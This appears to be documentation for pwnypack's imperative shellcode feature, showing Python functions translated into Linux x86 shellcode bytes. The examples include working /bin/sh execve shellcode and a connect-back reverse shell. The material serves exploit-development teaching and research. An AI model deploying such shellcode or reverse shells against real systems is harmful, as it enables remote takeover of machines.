.. _imperative-shellcode:

Imperatively defined shellcode
==============================

When using the imperatively defined shellcode, you translate a python function
to a set of shellcode primitives.

The set of operations you can use in your python function is limited. The
properties of the environment (syscalls, registers, functions) are exposed
as if they were magic globals: you cannot shadow them. From your shellcode
generator you can call syscalls and other primitives of the environment,
assign values to registers, use in-place addition/subtraction on registers
and assign values to locals (f.e. allocated buffers or data). You can also
access globals outside the shellcode generator function (f.e. pwnypack's
packing functions to construct data structures).

If you want to create a re-usable fragment for a commonly used subroutine,
you can do so by creating a function and decorating it with the
:func:`~pwnypack.shellcode.translate.fragment` decorator. If such a function
is called from within a shellcode function it will be translated in the
context of the current shellcode environment. Do note however that fragments
are inlined in the resulting shellcode, they're not implemented as functions.

You translate a function by using the environment's
:meth:`~pwnypack.shellcode.base.BaseEnvironment.translate` class method.

Examples:

    The following example creates an instance of the LinuxX86 environment
    and assembles a piece of shellcode that just calls the exit system call.

    >>> from pwny import *
    >>> @sc.LinuxX86Mutable.translate
    ... def shellcode():
    ...     sys_exit(0)
    ...
    >>> shellcode()
    '1\xdb\xb8\x01\x00\x00\x00\xcd\x80'

    To demonstrate how registers loading works, here's an example that does
    the same thing but in a different way:

    >>> from pwny import *
    >>> @sc.LinuxX86Mutable.translate
    ... def shellcode():
    ...     EAX = 0
    ...     sys_exit(EAX)
    ...
    >>> shellcode()
    '1\xc0\x89\xc3\xb8\x01\x00\x00\x00\xcd\x80'

    You can also use strings or bytes. If you use a unicode string, it will
    be UTF-8 encoded and zero-terminated. Bytes are allocated verbatim.

    >>> from pwny import *
    >>> @sc.LinuxX86Mutable.translate
    ... def shellcode():
    ...     sys_write(1, u'hello', 5)
    ...     sys_exit(0)
    ...
    >>> shellcode()
    '\xe8\x00\x00\x00\x00]\x83\xc5 \xba\x05\x00\x00\x00\x89\xe9\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x801\xdb\xb8\x01\x00\x00\x00\xcd\x80hello\x00'

    Or use lists as syscall arguments.

    >>> from pwny import *
    >>> @sc.LinuxX86Mutable.translate
    ... def shellcode():
    ...     sys_execve(u'/bin/sh', [u'/bin/sh', None], None)
    ...
    >>> shellcode()
    '\xe8\x00\x00\x00\x00]\x83\xc5\x151\xd21\xc0PU\x89\xe1\x89\xeb\xb8\x0b\x00\x00\x00\xcd\x80/bin/sh\x00'

    Need a buffer to write something to? We've got you covered.

    >>> from pwny import *
    >>> @sc.LinuxX86Mutable.translate
    ... def shellcode():
    ...     buf = alloc_buffer(64)
    ...     sys_read(0, buf, buf.length)
    ...     sys_write(1, buf, buf.length)
    ...     sys_exit(0)
    ...
    >>> shellcode()
    '\xba@\x00\x00\x00\x89\xe91\xdb\xb8\x03\x00\x00\x00\xcd\x80\xba@\x00\x00\x00\x89\xe9\xbb\x01\x00\x00\x00\xb8\x04\x00\x00\x00\xcd\x801\xdb\xb8\x01\x00\x00\x00\xcd\x80'

    You can also pass parameters to the shellcode function.

    >>> from pwny import *
    >>> @sc.LinuxX86Mutable.translate
    ... def shellcode(command):
    ...     sys_execve(u'/bin/sh', [u'/bin/sh', command, None], None)
    ...
    >>> shellcode(u'ls -lR')
    '\xe8\x00\x00\x00\x00]\x83\xc5\x1a1\xd21\xc0PU\x8dE\x07P\x89\xe1\x8d]\x07\xb8\x0b\x00\x00\x00\xcd\x80ls -lR\x00/bin/sh\x00'

    Combining all that, here's a somewhat larger example that also
    demonstrates using global and local variables, register aliases and
    fragments to implement a connect-back shell::

        from pwny import *
        import socket

        @sc.fragment
        def pack_sockaddr_in(addr, port):
            # Prepare the sockaddr_in struct:
            return pack(
                'H2s4s8s',
                socket.AF_INET,
                P16(port, endian=Target.Endian.big),
                socket.inet_aton(addr),
                b'........',  # Doesn't really have to be \0.
                target=target  # This is a fragment, target refers to the
                               # environment's target attribute.
            )

        @sc.fragment
        def exec_to_fd(fd, executable):
            # Set up register aliases (for convenience):
            arg0 = SYSCALL_ARG_MAP[0]
            arg1 = SYSCALL_ARG_MAP[1]

            # Call dup2 to connect stdin/out/err to the fd:
            sys_dup2(fd, 0)
            arg1 += 1; sys_dup2(arg0, arg1)
            arg1 += 1; sys_dup2(arg0, arg1)

            # Execute the command:
            sys_execve(executable, [executable, None], None)

        @sc.LinuxX86Mutable.translate
        def shell_connect(addr, port, shell=u'/bin/sh'):
            # Pack the sockaddr_in struct using a fragment:
            sockaddr = pack_sockaddr_in(addr, port)

            # Set up register alias (for convenience):
            socket_reg = SYSCALL_ARG_MAP[4]

            # Prepare socket:
            socket_reg = sys_socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
            sys_connect(socket_reg, sockaddr, len(sockaddr))

            # Call the fragment that calls dup2 and execve:
            exec_to_fd(socket_reg, shell)
